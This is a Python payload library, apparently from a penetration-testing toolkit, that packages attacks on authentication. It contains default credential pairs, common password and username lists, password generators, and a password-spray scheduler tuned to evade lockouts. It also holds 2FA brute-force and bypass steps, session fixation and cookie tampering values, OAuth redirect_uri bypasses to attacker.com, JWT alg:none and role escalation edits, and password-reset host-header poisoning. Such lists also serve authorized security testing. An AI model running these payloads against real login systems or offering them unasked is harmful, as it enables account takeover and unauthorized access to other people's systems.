#!/usr/bin/env python3
"""
Authentication Attack Payloads
==============================

Payloads for testing authentication mechanisms.

Attack Types:
- Default credentials
- Credential stuffing  
- Password spraying
- Username enumeration
- 2FA bypass
- Session attacks
"""

# ============================================================
# DEFAULT CREDENTIALS
# ============================================================
# Common default username/password combinations

DEFAULT_CREDENTIALS = [
    # Format: (username, password)
    
    # Generic
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "root"),
    ("admin", "toor"),
    ("admin", ""),
    ("administrator", "administrator"),
    ("administrator", "admin"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", ""),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("demo", "demo"),
    
    # Database defaults
    ("sa", ""),               # MSSQL
    ("sa", "sa"),
    ("postgres", "postgres"),  # PostgreSQL
    ("mysql", "mysql"),        # MySQL
    ("oracle", "oracle"),      # Oracle
    ("mongo", "mongo"),        # MongoDB
    
    # Network devices
    ("admin", "cisco"),
    ("cisco", "cisco"),
    ("admin", "admin1"),
    ("ubnt", "ubnt"),          # Ubiquiti
    ("pi", "raspberry"),       # Raspberry Pi
    
    # Web panels
    ("tomcat", "tomcat"),      # Apache Tomcat
    ("manager", "manager"),
    ("admin", "tomcat"),
    ("admin", "manager"),
    ("admin", "changeme"),
    
    # CMS defaults
    ("admin", "wordpress"),    # WordPress
    ("admin", "joomla"),       # Joomla
    ("admin", "drupal"),       # Drupal
    
    # IoT devices
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "4321"),
    ("admin", "888888"),
    ("admin", "default"),
    ("supervisor", "supervisor"),
]

# ============================================================
# COMMON PASSWORDS
# ============================================================
# Most frequently used passwords (for spraying)

COMMON_PASSWORDS = [
    # Top 50 most common
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    
    # Corporate patterns
    "Password1",
    "Password123",
    "Welcome1",
    "Welcome123",
    "Passw0rd",
    "P@ssw0rd",
    "P@ssword1",
    "Summer2024",
    "Winter2024",
    "Spring2024",
    "Fall2024",
    "Company123",
    "Temp1234",
    "Change123",
    "Qwerty123",
    "Admin123",
]

# ============================================================
# COMMON USERNAMES
# ============================================================
# Frequently used usernames

COMMON_USERNAMES = [
    # Generic
    "admin",
    "administrator",
    "root",
    "user",
    "test",
    "guest",
    "demo",
    "operator",
    "manager",
    "support",
    "info",
    "web",
    "www",
    "ftp",
    "mail",
    
    # First names
    "john",
    "jane",
    "mike",
    "david",
    "chris",
    "tom",
    "steve",
    "bob",
    "jim",
    "joe",
    "sam",
    "alex",
    "adam",
    "james",
    "daniel",
    "robert",
    
    # IT roles
    "sysadmin",
    "webmaster",
    "postmaster",
    "hostmaster",
    "dba",
    "devops",
    "developer",
    "svc_account",
    "service",
    "backup",
    
    # Email patterns
    "admin@{domain}",
    "info@{domain}",
    "support@{domain}",
    "contact@{domain}",
    "webmaster@{domain}",
    "postmaster@{domain}",
]

# ============================================================
# PASSWORD PATTERNS
# ============================================================
# Common password patterns to generate

def generate_seasonal_passwords(year: int = 2024) -> list:
    """Generate season+year passwords"""
    seasons = ["Spring", "Summer", "Fall", "Winter", "Autumn"]
    passwords = []
    for season in seasons:
        for y in [year, year - 1, year + 1]:
            passwords.extend([
                f"{season}{y}",
                f"{season}{y}!",
                f"{season}@{y}",
                f"{season.lower()}{y}",
                f"{season}{y % 100}",
            ])
    return passwords

def generate_company_passwords(company: str) -> list:
    """Generate company-based passwords"""
    patterns = [
        f"{company}123",
        f"{company}1234",
        f"{company}!",
        f"{company}@123",
        f"{company}2024",
        f"{company.capitalize()}123",
        f"{company.capitalize()}!",
        f"{company.upper()}123",
        f"Welcome{company}",
        f"Password{company}",
    ]
    return patterns

def generate_keyboard_patterns() -> list:
    """Common keyboard walk patterns"""
    return [
        "qwerty",
        "qwertyuiop",
        "asdfgh",
        "asdfghjkl",
        "zxcvbn",
        "zxcvbnm",
        "1qaz2wsx",
        "1qaz2wsx3edc",
        "qazwsx",
        "qazwsxedc",
        "!QAZ2wsx",
        "1qazXSW@",
    ]

# ============================================================
# 2FA BYPASS
# ============================================================
# Payloads to bypass two-factor authentication

MFA_BYPASS = {
    "otp_bruteforce": {
        "4_digit": [str(i).zfill(4) for i in range(10000)],
        "6_digit_common": [
            "000000", "111111", "123456", "654321",
            "000001", "999999", "123123", "112233",
        ],
    },
    
    "bypass_techniques": [
        "Remove 2FA parameter from request",
        "Set otp= (empty value)",
        "Set otp=000000",
        "Set otp=null",
        "Reuse old valid OTP",
        "Request new OTP then use old one",
        "Try backup codes endpoint",
        "Change response from 'false' to 'true'",
        "Skip 2FA step by direct URL access",
        "Use password reset to disable 2FA",
    ],
    
    "backup_codes_common": [
        "00000000",
        "12345678",
        "11111111",
        "AAAAAAAA",
    ],
}

# ============================================================
# SESSION ATTACKS
# ============================================================
# Session manipulation payloads

SESSION_ATTACKS = {
    "fixation": {
        "description": "Force victim to use attacker's session ID",
        "methods": [
            "Set SESSIONID cookie via XSS",
            "Set SESSIONID via URL parameter",
            "Set SESSIONID via hidden form field",
        ],
    },
    
    "prediction": {
        "description": "Predict valid session IDs",
        "checks": [
            "Is session ID sequential?",
            "Is session ID based on timestamp?",
            "Is session ID based on username hash?",
            "Is there insufficient entropy?",
        ],
    },
    
    "cookie_manipulation": [
        '{"user":"admin"}',
        'admin=true',
        'role=administrator',
        'isAdmin=1',
        'user_id=1',
        'auth=1',
    ],
}

# ============================================================
# OAUTH / SSO ATTACKS
# ============================================================

OAUTH_ATTACKS = {
    "redirect_uri_bypass": [
        # Open redirect in redirect_uri
        "https://attacker.com",
        "https://legitimate.com.attacker.com",
        "https://legitimate.com@attacker.com",
        "https://legitimate.com%2f%2fattacker.com",
        "https://legitimate.com/callback/../../../attacker",
        "https://legitimate.com/callback?next=https://attacker.com",
    ],
    
    "state_bypass": [
        # Missing state parameter (CSRF)
        "",
        "null",
        "undefined",
        "static_value",  # Reusable state
    ],
    
    "scope_escalation": [
        "openid profile email admin",
        "read write delete admin",
        "user:email user:admin",
    ],
}

# ============================================================
# JWT MANIPULATION
# ============================================================
# See payloads/jwt.py for comprehensive JWT attacks

JWT_QUICK = {
    "alg_none": '{"alg":"none","typ":"JWT"}',
    "alg_hs256": '{"alg":"HS256","typ":"JWT"}',
    
    "common_secrets": [
        "secret",
        "password",
        "123456",
        "changeme",
        "your-256-bit-secret",
        "your_jwt_secret",
        "",
    ],
    
    "role_escalation": {
        '"role":"user"': '"role":"admin"',
        '"admin":false': '"admin":true',
        '"is_admin":0': '"is_admin":1',
    },
}

# ============================================================
# PASSWORD RESET ATTACKS
# ============================================================

PASSWORD_RESET = {
    "host_header_injection": [
        # Poison password reset link
        "Host: attacker.com",
        "X-Forwarded-Host: attacker.com",
        "X-Host: attacker.com",
    ],
    
    "token_manipulation": [
        # Weak reset tokens
        "0000000000",
        "1234567890",
        "aaaaaaaaaa",
        # Try user ID as token
        "1",
        "2",
        # Try username/email hash
        "md5(email)",
    ],
    
    "rate_limit_bypass": [
        "Add X-Forwarded-For header",
        "Change case of email",
        "Add spaces/dots in email",
        "Use + alias in email",
    ],
}

# ============================================================
# USERNAME ENUMERATION
# ============================================================

USERNAME_ENUMERATION = {
    "response_differences": [
        "Different error messages",
        "Different response times",
        "Different response lengths",
        "Different HTTP status codes",
        "Different redirect locations",
    ],
    
    "common_endpoints": [
        "/login",
        "/register",
        "/signup",
        "/forgot-password",
        "/reset-password",
        "/api/users/check",
        "/api/users/exists",
        "/api/auth/check-email",
    ],
    
    "timing_attack": {
        "description": "Valid users may take longer (database lookup)",
        "threshold_ms": 50,  # Difference to detect
    },
}

# ============================================================
# ALL COMBINED
# ============================================================

ALL_PASSWORDS = COMMON_PASSWORDS + generate_seasonal_passwords() + generate_keyboard_patterns()
ALL_USERNAMES = COMMON_USERNAMES


# ============================================================
# HELPER FUNCTIONS
# ============================================================

def generate_credential_pairs(usernames: list = None, passwords: list = None) -> list:
    """Generate username/password pairs"""
    if usernames is None:
        usernames = ALL_USERNAMES[:20]
    if passwords is None:
        passwords = ALL_PASSWORDS[:50]
    
    pairs = []
    for user in usernames:
        for pwd in passwords:
            pairs.append((user, pwd))
    return pairs


def spray_passwords(usernames: list, passwords: list = None, delay_per_user: int = 30) -> list:
    """
    Generate password spray order.
    Tests one password against all users before moving to next password.
    Includes delay recommendation per user to avoid lockouts.
    """
    if passwords is None:
        passwords = ["Password1", "Welcome1", "Summer2024"]
    
    spray_order = []
    for password in passwords:
        for username in usernames:
            spray_order.append({
                "username": username,
                "password": password,
                "recommended_delay": delay_per_user,
            })
    
    return spray_order


# ============================================================
# USAGE
# ============================================================

if __name__ == "__main__":
    print("""
Authentication Payload Library
==============================

Categories:
  - DEFAULT_CREDENTIALS ({} pairs) - Default user/pass
  - COMMON_PASSWORDS ({} passwords) - Top passwords
  - COMMON_USERNAMES ({} usernames) - Common users
  - MFA_BYPASS - 2FA bypass techniques
  - SESSION_ATTACKS - Session manipulation
  - OAUTH_ATTACKS - OAuth/SSO attacks
  - PASSWORD_RESET - Reset token attacks

Usage:
  from payloads.auth import DEFAULT_CREDENTIALS, COMMON_PASSWORDS
  
  for username, password in DEFAULT_CREDENTIALS:
      if login(username, password):
          print(f"Default creds work: {{username}}:{{password}}")

Password spray:
  from payloads.auth import spray_passwords
  
  users = ["john", "jane", "admin"]
  for attempt in spray_passwords(users):
      login(attempt["username"], attempt["password"])
      time.sleep(attempt["recommended_delay"])
""".format(
        len(DEFAULT_CREDENTIALS),
        len(COMMON_PASSWORDS),
        len(COMMON_USERNAMES)
    ))
